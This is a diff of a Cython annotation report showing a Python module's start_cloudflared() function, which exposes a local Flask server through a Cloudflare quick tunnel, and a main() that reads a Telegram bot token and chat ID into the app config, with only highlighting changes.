-<pre class="cython line score-29" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">094</span>: def start_cloudflared():</pre>
+<pre class="cython line score-0">&#xA0;<span class="">093</span>: <span class="c"># ================= CLOUDFLARED TUNNEL =================</span></pre>
+<pre class="cython line score-29" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">094</span>: <span class="k">def</span><span class="w"> </span><span class="nf">start_cloudflared</span><span class="p">():</span></pre>
 <pre class='cython code score-29 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_17start_cloudflared(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
 static PyMethodDef __pyx_mdef_4main_17start_cloudflared = {"start_cloudflared", (PyCFunction)__pyx_pw_4main_17start_cloudflared, METH_NOARGS, 0};
@@ -2441,7 +2516,7 @@ static PyObject *__pyx_pf_4main_16start_cloudflared(CYTHON_UNUSED PyObject *__py
   #endif
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_start_cloudflared, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 94, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-20" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">095</span>:     time.sleep(2)  # wait for Flask</pre>
+</pre><pre class="cython line score-20" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">095</span>:     <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">2</span><span class="p">)</span>  <span class="c"># wait for Flask</span></pre>
 <pre class='cython code score-20 '>  __pyx_t_2 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_3, __pyx_mstate_global-&gt;__pyx_n_u_time);<span class='error_goto'> if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 95, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_3);
@@ -2469,7 +2544,7 @@ static PyObject *__pyx_pf_4main_16start_cloudflared(CYTHON_UNUSED PyObject *__py
     <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
-</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">096</span>:     print("🌐 Starting Cloudflared tunnel...")</pre>
+</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">096</span>:     <span class="k">print</span><span class="p">(</span><span class="s">&quot;🌐 Starting Cloudflared tunnel...&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-4 '>  __pyx_t_4 = NULL;
   __pyx_t_5 = 1;
   {
@@ -2480,14 +2555,14 @@ static PyObject *__pyx_pf_4main_16start_cloudflared(CYTHON_UNUSED PyObject *__py
     <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
-</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">097</span>:     proc = subprocess.Popen(</pre>
+</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">097</span>:     <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span></pre>
 <pre class='cython code score-5 '>  __pyx_t_4 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_subprocess);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 97, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   __pyx_t_3 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_Popen);<span class='error_goto'> if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 97, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_3);
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">098</span>:         ["cloudflared","tunnel","--url","127.0.0.1:5000/."],</pre>
+</pre><pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">098</span>:         <span class="p">[</span><span class="s">&quot;cloudflared&quot;</span><span class="p">,</span><span class="s">&quot;tunnel&quot;</span><span class="p">,</span><span class="s">&quot;--url&quot;</span><span class="p">,</span><span class="s">&quot;127.0.0.1:5000/.&quot;</span><span class="p">],</span></pre>
 <pre class='cython code score-17 '>  __pyx_t_2 = <span class='py_c_api'>PyList_New</span>(4);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_mstate_global-&gt;__pyx_n_u_cloudflared);
@@ -2502,19 +2577,19 @@ static PyObject *__pyx_pf_4main_16start_cloudflared(CYTHON_UNUSED PyObject *__py
   <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_mstate_global-&gt;__pyx_kp_u_127_0_0_1_5000);
   <span class='refnanny'>__Pyx_GIVEREF</span>(__pyx_mstate_global-&gt;__pyx_kp_u_127_0_0_1_5000);
   if (<span class='pyx_c_api'>__Pyx_PyList_SET_ITEM</span>(__pyx_t_2, 3, __pyx_mstate_global-&gt;__pyx_kp_u_127_0_0_1_5000) != (0)) <span class='error_goto'>__PYX_ERR(0, 98, __pyx_L1_error)</span>;
-</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">099</span>:         stdout=subprocess.PIPE,</pre>
+</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">099</span>:         <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span></pre>
 <pre class='cython code score-5 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_6, __pyx_mstate_global-&gt;__pyx_n_u_subprocess);<span class='error_goto'> if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 99, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_6);
   __pyx_t_7 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_6, __pyx_mstate_global-&gt;__pyx_n_u_PIPE);<span class='error_goto'> if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 99, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_7);
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_6); __pyx_t_6 = 0;
-</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">100</span>:         stderr=subprocess.STDOUT,</pre>
+</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">100</span>:         <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span></pre>
 <pre class='cython code score-5 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_6, __pyx_mstate_global-&gt;__pyx_n_u_subprocess);<span class='error_goto'> if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 100, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_6);
   __pyx_t_8 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_6, __pyx_mstate_global-&gt;__pyx_n_u_STDOUT);<span class='error_goto'> if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 100, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_8);
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_6); __pyx_t_6 = 0;
-</pre><pre class="cython line score-26" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">101</span>:         text=True</pre>
+</pre><pre class="cython line score-26" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">101</span>:         <span class="n">text</span><span class="o">=</span><span class="bp">True</span></pre>
 <pre class='cython code score-26 '>  __pyx_t_5 = 1;
   #if CYTHON_UNPACK_METHODS
   if (unlikely(<span class='py_c_api'>PyMethod_Check</span>(__pyx_t_3))) {
@@ -2546,8 +2621,8 @@ static PyObject *__pyx_pf_4main_16start_cloudflared(CYTHON_UNUSED PyObject *__py
   }
   __pyx_v_proc = __pyx_t_1;
   __pyx_t_1 = 0;
-</pre><pre class="cython line score-0">&#xA0;<span class="">102</span>:     )</pre>
-<pre class="cython line score-52" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">103</span>:     for line in proc.stdout:</pre>
+</pre><pre class="cython line score-0">&#xA0;<span class="">102</span>:     <span class="p">)</span></pre>
+<pre class="cython line score-52" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">103</span>:     <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="p">:</span></pre>
 <pre class='cython code score-52 '>  __pyx_t_1 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_v_proc, __pyx_mstate_global-&gt;__pyx_n_u_stdout);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 103, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   if (likely(<span class='py_c_api'>PyList_CheckExact</span>(__pyx_t_1)) || <span class='py_c_api'>PyTuple_CheckExact</span>(__pyx_t_1)) {
@@ -2610,7 +2685,7 @@ static PyObject *__pyx_pf_4main_16start_cloudflared(CYTHON_UNUSED PyObject *__py
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_3); __pyx_t_3 = 0;
   goto __pyx_L7_for_end;
   __pyx_L7_for_end:;
-</pre><pre class="cython line score-9" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">104</span>:         print(line.strip())</pre>
+</pre><pre class="cython line score-9" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">104</span>:         <span class="k">print</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span></pre>
 <pre class='cython code score-9 '>    __pyx_t_6 = NULL;
     __pyx_t_7 = __pyx_v_line;
     <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_t_7);
@@ -2632,18 +2707,18 @@ static PyObject *__pyx_pf_4main_16start_cloudflared(CYTHON_UNUSED PyObject *__py
       <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
     }
     <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
-</pre><pre class="cython line score-2" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">105</span>:         if "trycloudflare.com" in line:</pre>
+</pre><pre class="cython line score-2" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">105</span>:         <span class="k">if</span> <span class="s">&quot;trycloudflare.com&quot;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span></pre>
 <pre class='cython code score-2 '>    __pyx_t_11 = (<span class='pyx_c_api'>__Pyx_PySequence_ContainsTF</span>(__pyx_mstate_global-&gt;__pyx_kp_u_trycloudflare_com, __pyx_v_line, Py_EQ)); if (unlikely((__pyx_t_11 &lt; 0))) <span class='error_goto'>__PYX_ERR(0, 105, __pyx_L1_error)</span>
     if (__pyx_t_11) {
 /* … */
     }
-</pre><pre class="cython line score-3" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">106</span>:             import re</pre>
+</pre><pre class="cython line score-3" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">106</span>:             <span class="k">import</span><span class="w"> </span><span class="nn">re</span></pre>
 <pre class='cython code score-3 '>      __pyx_t_12 = <span class='pyx_c_api'>__Pyx_Import</span>(__pyx_mstate_global-&gt;__pyx_n_u_re, 0, 0, NULL, 0);<span class='error_goto'> if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 106, __pyx_L1_error)</span>
       __pyx_t_1 = __pyx_t_12;
       <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
       <span class='pyx_macro_api'>__Pyx_XDECREF_SET</span>(__pyx_v_re, __pyx_t_1);
       __pyx_t_1 = 0;
-</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">107</span>:             match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)</pre>
+</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">107</span>:             <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&quot;https://[a-zA-Z0-9-]+\.trycloudflare\.com&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span></pre>
 <pre class='cython code score-5 '>      __pyx_t_8 = __pyx_v_re;
       <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_t_8);
       __pyx_t_5 = 0;
@@ -2656,12 +2731,12 @@ static PyObject *__pyx_pf_4main_16start_cloudflared(CYTHON_UNUSED PyObject *__py
       }
       <span class='pyx_macro_api'>__Pyx_XDECREF_SET</span>(__pyx_v_match, __pyx_t_1);
       __pyx_t_1 = 0;
-</pre><pre class="cython line score-2" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">108</span>:             if match:</pre>
+</pre><pre class="cython line score-2" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">108</span>:             <span class="k">if</span> <span class="n">match</span><span class="p">:</span></pre>
 <pre class='cython code score-2 '>      __pyx_t_11 = <span class='pyx_c_api'>__Pyx_PyObject_IsTrue</span>(__pyx_v_match); if (unlikely((__pyx_t_11 &lt; 0))) <span class='error_goto'>__PYX_ERR(0, 108, __pyx_L1_error)</span>
       if (__pyx_t_11) {
 /* … */
       }
-</pre><pre class="cython line score-15" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">109</span>:                 print(f"\n✅ Public URL: {match.group()}")</pre>
+</pre><pre class="cython line score-15" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">109</span>:                 <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">✅ Public URL: {match.group()}&quot;</span><span class="p">)</span></pre>
 <pre class='cython code score-15 '>        __pyx_t_8 = NULL;
         __pyx_t_7 = __pyx_v_match;
         <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_t_7);
@@ -2689,11 +2764,11 @@ static PyObject *__pyx_pf_4main_16start_cloudflared(CYTHON_UNUSED PyObject *__py
           <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
         }
         <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
-</pre><pre class="cython line score-0" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">110</span>:                 break</pre>
+</pre><pre class="cython line score-0" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">110</span>:                 <span class="k">break</span></pre>
 <pre class='cython code score-0 '>        goto __pyx_L4_break;
 </pre><pre class="cython line score-0">&#xA0;<span class="">111</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">112</span>: # ================= MAIN FUNCTION =================</pre>
-<pre class="cython line score-15" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">113</span>: def main():</pre>
+<pre class="cython line score-0">&#xA0;<span class="">112</span>: <span class="c"># ================= MAIN FUNCTION =================</span></pre>
+<pre class="cython line score-15" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">113</span>: <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span></pre>
 <pre class='cython code score-15 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_19main(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
 static PyMethodDef __pyx_mdef_4main_19main = {"main", (PyCFunction)__pyx_pw_4main_19main, METH_NOARGS, 0};
@@ -2722,7 +2797,7 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
   #endif
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_main_2, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 113, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">114</span>:     BOT_TOKEN = input("🤖 Telegram Bot Token: ").strip()</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">114</span>:     <span class="n">BOT_TOKEN</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">&quot;🤖 Telegram Bot Token: &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span></pre>
 <pre class='cython code score-8 '>  __pyx_t_4 = NULL;
   __pyx_t_5 = 1;
   {
@@ -2745,7 +2820,7 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   __pyx_v_BOT_TOKEN = __pyx_t_1;
   __pyx_t_1 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">115</span>:     CHAT_ID   = input("💬 Telegram Chat ID: ").strip()</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">115</span>:     <span class="n">CHAT_ID</span>   <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">&quot;💬 Telegram Chat ID: &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span></pre>
 <pre class='cython code score-8 '>  __pyx_t_4 = NULL;
   __pyx_t_5 = 1;
   {
@@ -2769,8 +2844,8 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
   __pyx_v_CHAT_ID = __pyx_t_1;
   __pyx_t_1 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">116</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">117</span>:     # Store tokens in Flask app config</pre>
-<pre class="cython line score-11" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">118</span>:     app.config["BOT_TOKEN"] = BOT_TOKEN</pre>
+<pre class="cython line score-0">&#xA0;<span class="">117</span>:     <span class="c"># Store tokens in Flask app config</span></pre>
+<pre class="cython line score-11" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">118</span>:     <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s">&quot;BOT_TOKEN&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">BOT_TOKEN</span></pre>
 <pre class='cython code score-11 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_app);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 118, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_config);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 118, __pyx_L1_error)</span>
@@ -2778,7 +2853,7 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
   if (unlikely((<span class='py_c_api'>PyObject_SetItem</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_BOT_TOKEN, __pyx_v_BOT_TOKEN) &lt; 0))) <span class='error_goto'>__PYX_ERR(0, 118, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-11" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">119</span>:     app.config["CHAT_ID"] = CHAT_ID</pre>
+</pre><pre class="cython line score-11" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">119</span>:     <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s">&quot;CHAT_ID&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">CHAT_ID</span></pre>
 <pre class='cython code score-11 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_app);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 119, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   __pyx_t_1 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_config);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 119, __pyx_L1_error)</span>
@@ -2787,7 +2862,7 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
   if (unlikely((<span class='py_c_api'>PyObject_SetItem</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_CHAT_ID, __pyx_v_CHAT_ID) &lt; 0))) <span class='error_goto'>__PYX_ERR(0, 119, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">120</span>: </pre>
-<pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">121</span>:     banner()</pre>
+<pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">121</span>:     <span class="n">banner</span><span class="p">()</span></pre>
 <pre class='cython code score-17 '>  __pyx_t_2 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_3, __pyx_mstate_global-&gt;__pyx_n_u_banner);<span class='error_goto'> if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 121, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_3);
@@ -2813,7 +2888,7 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">122</span>: </pre>
-<pre class="cython line score-35" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">123</span>:     threading.Thread(target=start_cloudflared, daemon=True).start()</pre>
+<pre class="cython line score-35" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">123</span>:     <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">start_cloudflared</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span></pre>
 <pre class='cython code score-35 '>  __pyx_t_4 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_6, __pyx_mstate_global-&gt;__pyx_n_u_threading);<span class='error_goto'> if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 123, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_6);
@@ -2860,7 +2935,7 @@ static PyObject *__pyx_pf_4main_18main(CYTHON_UNUSED PyObject *__pyx_self) {
     <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
-</pre><pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">124</span>:     print("🔥 Local server running on http://localhost:5000")</pre>
